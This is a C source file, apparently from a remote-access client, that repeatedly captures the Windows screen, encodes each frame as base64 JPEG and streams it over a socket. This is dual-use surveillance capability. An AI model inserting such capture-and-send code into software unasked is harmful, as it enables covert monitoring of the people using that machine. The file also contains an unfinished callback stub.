#include "screen.h"
#define STB_IMAGE_WRITE_IMPLEMENTATION
#include "stbi_image_write.h"
#include <stdio.h>

static void jpeg_write_func(void* context, void* data, int size) {
    unsigned char** buf = (unsigned char**)context;
    // This is a simplified memory buffer writer.
    // In a real implementation we'd need a dynamic buffer.
}

// Helper to scale dimensions
static void scale_dims(int w, int h, int max_w, int max_h, int* nw, int* nh) {
    if (w <= max_w && h <= max_h) {
        *nw = w; *nh = h;
        return;
    }
    float scale = (float)max_w / w;
    if ((float)max_h / h < scale) scale = (float)max_h / h;
    *nw = (int)(w * scale);
    *nh = (int)(h * scale);
}

void screen_stream_loop(SOCKET sock, HANDLE mutex, HANDLE stop_event, int fps) {
    int interval = 1000 / (fps > 0 ? fps : 1);

    HDC hScreen = GetDC(NULL);
    int screen_w = GetSystemMetrics(SM_CXSCREEN);
    int screen_h = GetSystemMetrics(SM_CYSCREEN);

    while (WaitForSingleObject(stop_event, interval) == WAIT_TIMEOUT) {
        HDC hMem = CreateCompatibleDC(hScreen);
        HBITMAP hBmp = CreateCompatibleBitmap(hScreen, screen_w, screen_h);
        HGDIOBJ hOld = SelectObject(hMem, hBmp);

        BitBlt(hMem, 0, 0, screen_w, screen_h, hScreen, 0, 0, SRCCOPY);

        BITMAPINFOHEADER bi = { sizeof(bi), screen_w, -screen_h, 1, 32, BI_RGB };
        unsigned char* pixels = malloc(screen_w * screen_h * 4);
        GetDIBits(hMem, hBmp, 0, screen_h, pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

        // Convert BGRA to RGB
        unsigned char* rgb = malloc(screen_w * screen_h * 3);
        for (int i = 0; i < screen_w * screen_h; i++) {
            rgb[i * 3 + 0] = pixels[i * 4 + 2];
            rgb[i * 3 + 1] = pixels[i * 4 + 1];
            rgb[i * 3 + 2] = pixels[i * 4 + 0];
        }
        free(pixels);

        // For simplicity, we write to a temporary file then read back.
        // stb_image_write doesn't have a direct "to memory" JPEG function without a callback.
        char tmp[MAX_PATH];
        GetTempPathA(MAX_PATH, tmp);
        strcat(tmp, "screen.jpg");

        stbi_write_jpg(tmp, screen_w, screen_h, 3, rgb, 50);
        free(rgb);

        FILE* f = fopen(tmp, "rb");
        if (f) {
            fseek(f, 0, SEEK_END);
            long size = ftell(f);
            fseek(f, 0, SEEK_SET);
            unsigned char* jpg_data = malloc(size);
            fread(jpg_data, 1, size, f);
            fclose(f);
            DeleteFileA(tmp);

            size_t b64_len;
            char* b64 = base64_encode(jpg_data, size, &b64_len);
            free(jpg_data);

            char* msg = malloc(b64_len + 32);
            sprintf(msg, "[screen_frame]%s", b64);
            sock_send(sock, mutex, msg);
            free(msg); free(b64);
        }

        SelectObject(hMem, hOld);
        DeleteObject(hBmp);
        DeleteDC(hMem);
    }
    ReleaseDC(NULL, hScreen);
}
